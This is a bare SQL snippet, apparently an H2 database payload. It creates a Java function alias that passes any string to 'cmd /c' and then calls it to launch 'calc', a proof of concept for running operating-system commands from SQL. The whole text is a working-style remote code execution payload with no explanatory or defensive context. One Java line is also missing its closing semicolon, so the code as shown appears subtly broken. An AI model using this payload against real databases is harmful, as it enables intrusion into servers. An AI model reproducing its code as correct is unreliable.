CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {
String[] command = {"cmd", "/c", cmd};
Runtime.getRuntime().exec(command)
}
$$;
CALL SHELLEXEC('calc')